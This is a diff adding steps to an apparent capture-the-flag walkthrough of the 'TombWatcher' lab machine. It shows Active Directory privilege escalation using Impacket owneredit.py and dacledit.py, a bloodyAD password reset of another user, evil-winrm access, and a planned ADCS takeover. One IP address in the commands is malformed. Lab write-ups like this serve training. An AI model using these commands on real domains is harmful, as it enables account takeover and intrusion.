@@ -54,6 +54,13 @@
 `sudo python3 /usr/lib/python3/dist-packages/impacket/examples/owneredit.py -action write  -target 'John' -dc-ip 10.129.47.3 -new-owner 'sam' 'tombwatcher.htb'/'sam':'Password1'` 
 ![image](https://github.com/user-attachments/assets/7aaa18a9-d749-4a41-9860-1e97ad98812f)
 
-9. 
+9. Now that Sam is owner of John, give Sam FullControl rights on John's account with Impacket's dacledit.py script.
+`sudo python3 /usr/lib/python3/dist-packages/impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Password1' -dc-ip 10.129.47.32.88`
 
+10. Can now change John's password
+`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.32.88 -d tombwatcher.htb -u sam -p Password1 set password john Password123`
+
+11. John can PSRemote into the machine, so with evil-winrm we gain access to the box and get the user flag!
+
+12. From here, John has GenericAll privileges on the Certificate Services, ADCS, so give John FullControl of ADCS.
 
